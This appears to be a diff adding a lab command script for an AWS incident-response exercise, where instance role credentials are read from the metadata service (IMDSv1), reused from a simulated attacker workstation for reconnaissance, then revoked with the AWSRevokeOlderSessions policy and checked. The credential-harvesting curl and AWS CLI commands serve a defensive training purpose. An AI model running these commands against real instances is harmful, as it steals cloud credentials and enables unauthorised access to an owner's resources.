@@ -1,0 +1,67 @@
+# ==============================================================================
+# AWS INCIDENT RESPONSE: IMDS CREDENTIAL EXFILTRATION & REVOCATION
+# Author: Kriti
+# Lab Execution Commands & Proof of Concept
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# STEP 1: RECONNAISSANCE & CREDENTIAL EXFILTRATION (Compromised EC2 Instance A)
+# Connect to EC2 via SSM Session Manager or SSH
+# ------------------------------------------------------------------------------
+
+# Query the local Instance Metadata Service (IMDSv1) to identify attached IAM role
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Retrieve temporary security credentials (AccessKeyId, SecretAccessKey, Token) for the role
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/A4L-InstanceRole
+
+
+# ------------------------------------------------------------------------------
+# STEP 2: EXTERNAL THREAT VECTOR / ATTACKER SIMULATION (Workstation Terminal)
+# Simulating an attacker using stolen temporary credentials on an external machine
+# ------------------------------------------------------------------------------
+
+# Set environment variables using the exfiltrated temporary credentials
+# (For Windows Command Prompt)
+SET AWS_ACCESS_KEY_ID=ASIA...
+SET AWS_SECRET_ACCESS_KEY=...
+SET AWS_SESSION_TOKEN=...
+
+
+# Verify caller identity to confirm stolen role context
+aws sts get-caller-identity
+
+# Abuse stolen permissions to recon AWS resources remotely
+aws ec2 describe-instances --region us-east-1
+aws s3 ls
+
+
+# ------------------------------------------------------------------------------
+# STEP 3: INCIDENT MITIGATION & SESSION REVOCATION (IAM Console Action)
+# Applied 'AWSRevokeOlderSessions' policy inline to revoke tokens issued before current time.
+# ------------------------------------------------------------------------------
+
+
+# ------------------------------------------------------------------------------
+# STEP 4: VERIFICATION & MITIGATION TESTING (Attacker Workstation & EC2)
+# ------------------------------------------------------------------------------
+
+# Test 1: Try using exfiltrated credentials from the attacker workstation again
+# EXPECTED RESULT: AccessDenied error (Stolen session is invalidated!)
+aws ec2 describe-instances --region us-east-1
+aws s3 ls
+
+# Test 2: Check EC2 instance local access after incident response
+# EC2 instances automatically fetch FRESH credentials from IMDS upon next request
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/A4L-InstanceRole
+
+
+# ------------------------------------------------------------------------------
+# STEP 5: RECOVERING EC2 INSTANCE FUNCTIONALITY (Instance Stop & Start)
+# Stopping and starting the EC2 instance issues a completely new credential token set.
+# ------------------------------------------------------------------------------
+
+# Verify that the EC2 instance has resumed normal operational access with new credentials
+aws ec2 describe-instances --region us-east-1
+aws s3 ls
